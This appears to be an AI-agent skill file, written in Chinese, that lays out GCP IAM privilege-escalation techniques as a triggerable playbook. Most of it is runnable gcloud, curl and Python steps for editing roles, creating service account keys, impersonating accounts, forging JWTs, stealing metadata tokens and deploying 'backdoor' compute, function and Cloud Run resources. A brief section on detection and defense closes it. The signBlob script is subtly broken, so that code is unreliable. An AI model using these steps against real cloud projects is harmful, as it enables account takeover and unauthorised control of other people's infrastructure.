---
name: gcp-iam-privesc
description: GCP IAM 权限提升完整技术 - 服务账号利用、角色更新、令牌伪造
category: 云安全渗透测试
platform: GCP
technique_type: 权限提升
triggers:
  - "GCP 权限提升"
  - "GCP IAM privesc"
  - "服务账号利用"
  - "gcloud 权限提升"
---

# GCP IAM 权限提升技术

## 触发条件

当用户要求以下任务时激活此技能：

- "测试 GCP IAM 权限提升"
- "GCP 服务账号利用"
- "gcp iam privesc"
- "提升 GCP 访问权限"
- "GCP 渗透测试"

---

## 技术清单

### 1. `iam.roles.update` + `iam.roles.get`

**原理**: 修改分配给自己的角色，添加额外权限

```bash
# 步骤 1: 查看当前角色
gcloud iam roles list --project=PROJECT_ID

# 步骤 2: 查看角色详情
gcloud iam roles describe ROLE_NAME --project=PROJECT_ID

# 步骤 3: 向角色添加权限
gcloud iam roles update ROLE_NAME \
  --project=PROJECT_ID \
  --add-permissions="compute.instances.create,storage.objects.create"

# 步骤 4: 验证权限已添加
gcloud iam roles describe ROLE_NAME --project=PROJECT_ID

# 现在可以使用新权限
gcloud compute instances create test-instance --zone=us-central1-a
```

**影响**: 为现有角色添加任意权限

---

### 2. `iam.roles.create` + `iam.serviceAccounts.setIamPolicy`

**原理**: 创建自定义角色并分配给自己

```bash
# 步骤 1: 创建自定义角色
gcloud iam roles create custom-admin \
  --project=PROJECT_ID \
  --title="Custom Admin" \
  --description="Custom admin role for privesc" \
  --permissions="compute.*,storage.*,iam.serviceAccounts.actAs"

# 步骤 2: 查看可用的服务账号
gcloud iam service-accounts list

# 步骤 3: 将自定义角色分配给自己
gcloud iam service-accounts add-iam-policy-binding SA_NAME@PROJECT_ID.iam.gserviceaccount.com \
  --member="user:your-email@example.com" \
  --role="projects/PROJECT_ID/roles/custom-admin"

# 步骤 4: 模拟服务账号
gcloud iam service-accounts impersonate SA_NAME@PROJECT_ID.iam.gserviceaccount.com
```

**影响**: 创建具有任意权限的角色并分配给自己

---

### 3. `iam.serviceAccounts.getAccessToken` + `iam.serviceAccounts.get`

**原理**: 请求高权限服务账号的访问令牌

```bash
# 步骤 1: 列出服务账号
gcloud iam service-accounts list

# 步骤 2: 检查服务账号权限
gcloud iam service-accounts get-iam-policy SA_NAME@PROJECT_ID.iam.gserviceaccount.com

# 步骤 3: 模拟服务账号并获取令牌
gcloud auth print-access-token \
  --impersonate-service-account=SA_NAME@PROJECT_ID.iam.gserviceaccount.com

# 步骤 4: 使用令牌
ACCESS_TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=SA_NAME@PROJECT_ID.iam.gserviceaccount.com)

curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/aggregated/instances
```

**影响**: 获取服务账号的完整访问权限

---

### 4. `iam.serviceAccountKeys.create`

**原理**: 为服务账号创建新的密钥对

```bash
# 步骤 1: 为服务账号创建密钥
gcloud iam service-accounts keys create key.json \
  --iam-account=SA_NAME@PROJECT_ID.iam.gserviceaccount.com

# 步骤 2: 使用密钥进行认证
gcloud auth activate-service-account --key-file=key.json

# 步骤 3: 验证权限
gcloud auth list
gcloud projects list

# 步骤 4: 列出服务账号的所有密钥
gcloud iam service-accounts keys list \
  --iam-account=SA_NAME@PROJECT_ID.iam.gserviceaccount.com
```

**影响**: 获取服务账号的长期访问凭据

---

### 5. `iam.serviceAccounts.implicitDelegation`

**原理**: 使用隐式委托链获取第三方服务账号的令牌

```bash
# 场景：你控制 SA1，SA1 可以模拟 SA2，SA2 有高权限

# 步骤 1: 通过 API 直接获取令牌
curl -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -d '{
    "delegates": ["projects/-/serviceAccounts/DELEGATED_SA@PROJECT_ID.iam.gserviceaccount.com"],
    "scope": ["https://www.googleapis.com/auth/cloud-platform"]
  }'

# 步骤 2: 使用返回的访问令牌
ACCESS_TOKEN="返回的accessToken"

# 步骤 3: 以目标服务账号身份执行操作
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID
```

**影响**: 通过委托链获取高权限服务账号的令牌

---

### 6. `iam.serviceAccounts.signBlob`

**原理**: 使用服务账号签名任意数据，创建伪造 JWT

```python
# sign_blob_exploit.py
import google.auth
import google.auth.transport.requests
from google.cloud.iam_credentials_v1 import IAMCredentialsClient
import base64
import json

def create_signed_jwt(sa_email, project_id):
    # 创建未签名的 JWT
    header = {
        "alg": "RS256",
        "typ": "JWT"
    }

    payload = {
        "iss": sa_email,
        "sub": sa_email,
        "aud": "https://storage.googleapis.com/",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    # 编码
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

    # 要签名的消息
    message = f"{header_b64}.{payload_b64}"

    # 使用服务账号签名
    client = IAMCredentialsClient()
    response = client.sign_blob(
        name=f"projects/-/serviceAccounts/{sa_email}",
        payload=message.encode()
    )

    signature = response.signature_b64

    # 构造完整的 JWT
    jwt = f"{message}.{signature}"
    return jwt

# 使用
jwt_token = create_signed_jwt("target-sa@project-id.iam.gserviceaccount.com", "project-id")

# 使用 JWT 访问资源
import requests
headers = {"Authorization": f"Bearer {jwt_token}"}
response = requests.get("https://storage.googleapis.com/storage/v1/b", headers=headers)
```

**影响**: 创建任意有效的 JWT 令牌

---

### 7. `iam.serviceAccounts.signJwt`

**原理**: 直接签名格式正确的 JWT

```bash
# 步骤 1: 创建 JWT payload
cat > jwt_payload.json <<EOF
{
  "sub": "user@example.com",
  "aud": "https://storage.googleapis.com/",
  "iat": 1234567890,
  "exp": 9999999999
}
EOF

# 步骤 2: 使用服务账号签名
gcloud iam service-accounts sign-jwt SA_NAME@PROJECT_ID.iam.gserviceaccount.com \
  jwt_payload.json signed_jwt.txt

# 步骤 3: 使用签名的 JWT
SIGNED_JWT=$(cat signed_jwt.txt | jq -r '.signedJwt')

curl -H "Authorization: Bearer $SIGNED_JWT" \
  https://storage.googleapis.com/storage/v1/b
```

**影响**: 生成有效的 GCP JWT 令牌

---

### 8. `iam.serviceAccounts.setIamPolicy`

**原理**: 修改服务账号的 IAM 策略

```bash
# 步骤 1: 创建策略文件
cat > policy.yaml <<EOF
bindings:
  - members:
    - user:your-email@example.com
    role: roles/iam.serviceAccountTokenCreator
  - members:
    - user:your-email@example.com
    role: roles/iam.serviceAccountUser
EOF

# 步骤 2: 设置服务账号策略
gcloud iam service-accounts set-iam-policy SA_NAME@PROJECT_ID.iam.gserviceaccount.com \
  policy.yaml

# 步骤 3: 验证策略已设置
gcloud iam service-accounts get-iam-policy SA_NAME@PROJECT_ID.iam.gserviceaccount.com

# 步骤 4: 现在可以模拟服务账号
gcloud iam service-accounts impersonate SA_NAME@PROJECT_ID.iam.gserviceaccount.com
```

**影响**: 授予自己对服务账号的完全控制

---

### 9. `iam.serviceAccounts.actAs`

**原理**: 在各种 GCP 服务中使用服务账号

```bash
# 场景 1: 通过 Compute Engine 使用
# 创建使用高权限服务账号的实例
gcloud compute instances create backdoor-instance \
  --zone=us-central1-a \
  --service-account=PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform

# 通过 SSH 连接到实例并使用元数据服务
gcloud compute ssh backdoor-instance --zone=us-central1-a
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# 场景 2: 通过 Cloud Functions 使用
# 创建使用高权限服务账号的函数
gcloud functions create backdoor-function \
  --runtime=python39 \
  --service-account=PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com \
  --source=./function_code \
  --trigger-http

# 场景 3: 通过 Cloud Run 使用
gcloud run deploy backdoor-service \
  --service-account=PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com \
  --source=./service_code \
  --platform=managed \
  --region=us-central1
```

**影响**: 通过各种 GCP 服务获取高权限服务账号的访问权限

---

### 10. `iam.serviceAccounts.getOpenIdToken`

**原理**: 生成 OpenID Connect 令牌

```bash
# 步骤 1: 激活服务账号
gcloud auth activate-service-account --key-file=sa_credentials.json

# 步骤 2: 生成 OpenID 令牌
gcloud auth print-identity-token \
  SA_NAME@PROJECT_ID.iam.gserviceaccount.com \
  --audiences=https://example.com

# 步骤 3: 使用令牌访问服务
ID_TOKEN=$(gcloud auth print-identity-token \
  SA_NAME@PROJECT_ID.iam.gserviceaccount.com \
  --audiences=https://example.com)

curl -H "Authorization: Bearer $ID_TOKEN" \
  https://example.com/api

# 支持的服务：
# - Cloud Run
# - Cloud Functions
# - Identity-Aware Proxy
# - Cloud Endpoints
```

**影响**: 生成用于身份验证的 OIDC 令牌

---

## GCP IAM 权限提升决策树

```
获取到 GCP 凭证
│
├─ 有 iam.roles.update
│  └─ 修改现有角色添加权限
│
├─ 有 iam.roles.create + iam.serviceAccounts.setIamPolicy
│  └─ 创建自定义角色并分配
│
├─ 有 iam.serviceAccounts.getAccessToken
│  └─ 模拟高权限服务账号
│
├─ 有 iam.serviceAccountKeys.create
│  └─ 创建服务账号密钥
│
├─ 有 iam.serviceAccounts.implicitDelegation
│  └─ 使用委托链
│
├─ 有 iam.serviceAccounts.signBlob
│  └─ 签名任意数据
│
├─ 有 iam.serviceAccounts.signJwt
│  └─ 签名 JWT
│
├─ 有 iam.serviceAccounts.setIamPolicy
│  └─ 修改服务账号策略
│
└─ 有 iam.serviceAccounts.actAs
   └─ 通过 GCP 服务使用服务账号
```

---

## 完整攻击流程

### 场景 1: 从基础权限到管理员

```bash
# 步骤 1: 检查当前权限
gcloud auth list
gcloud projects list

# 步骤 2: 枚举服务账号
gcloud iam service-accounts list

# 步骤 3: 检查服务账号权限
gcloud iam service-accounts get-iam-policy target-sa@PROJECT_ID.iam.gserviceaccount.com

# 步骤 4: 发现有 iam.serviceAccounts.setIamPolicy 权限
# 创建策略文件授予自己完全控制
cat > policy.yaml <<EOF
bindings:
  - members:
    - user:your-email@example.com
    role: roles/iam.serviceAccountAdmin
  - members:
    - user:your-email@example.com
    role: roles/iam.serviceAccountTokenCreator
  - members:
    - user:your-email@example.com
    role: roles/iam.serviceAccountUser
EOF

# 步骤 5: 应用策略
gcloud iam service-accounts set-iam-policy target-sa@PROJECT_ID.iam.gserviceaccount.com policy.yaml

# 步骤 6: 模拟服务账号
gcloud iam service-accounts impersonate target-sa@PROJECT_ID.iam.gserviceaccount.com

# 步骤 7: 使用服务账号权限进行操作
gcloud compute instances list --impersonate-service-account=target-sa@PROJECT_ID.iam.gserviceaccount.com
```

---

## 防御措施

### 检测方法

```bash
# 使用 Cloud Audit Logs 监控
gcloud logging read 'protoPayload.serviceName="iam.googleapis.com"' \
  --project=PROJECT_ID \
  --freshness=1d

# 监控服务账号密钥创建
gcloud logging read \
  'protoPayload.methodName:"CreateServiceAccountKey"' \
  --project=PROJECT_ID

# 监控角色修改
gcloud logging read \
  'protoPayload.methodName:"UpdateRole"' \
  --project=PROJECT_ID
```

### 防御建议

1. **最小权限**: 严格限制服务账号权限
2. **定期审查**: 定期审查 IAM 策略和服务账号
3. **密钥轮换**: 定期轮换服务账号密钥
4. **监控告警**: 配置 Cloud Audit Logs 告警
5. **禁止自动创建**: 禁止自动创建服务账号密钥

---

## 参考资源

- HackTricks GCP IAM Privesc: https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-pentesting/gcp-iam-privesc
- Rhino Security Labs - GCP Privesc: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- GCP IAM 文档: https://cloud.google.com/iam/docs
- GCP IAM Permissions: https://cloud.google.com/iam/docs/permissions-reference
